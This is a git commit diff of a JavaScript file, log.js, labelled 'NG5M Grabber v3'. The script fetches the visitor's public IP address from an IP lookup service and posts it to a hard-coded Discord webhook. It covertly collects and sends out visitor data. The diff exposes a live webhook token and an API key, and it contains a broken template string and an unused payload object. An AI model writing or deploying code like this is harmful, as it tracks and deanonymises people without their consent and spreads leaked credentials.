1db78661f698aee5f34a50436529cc5676ca0855
rexgamer338571 <85365081+rexgamer338571@users.noreply.github.com>
2023-08-12 19:12:59 +0200

    Update log.js

--- log.js
+++ log.js
@@ -1,9 +1,20 @@
 var a = new XMLHttpRequest();
 
-a.open("GET","https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7");
-a.setRequestHeader('Accept','application/json');
+a.open("GET","https://api64.ipify.org");
 a.onreadystatechange = function () {
     if (this.readyState === 4) {
+        data = {
+            "content":"New log!",
+            "username":"NG5M Grabber v3"
+        }
+
+        data["embeds"] = [
+            {
+                "description":`IP: {this.responseText}`,
+                "title":"Info"
+            }
+        ]
+
         fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText})});
     }
 };
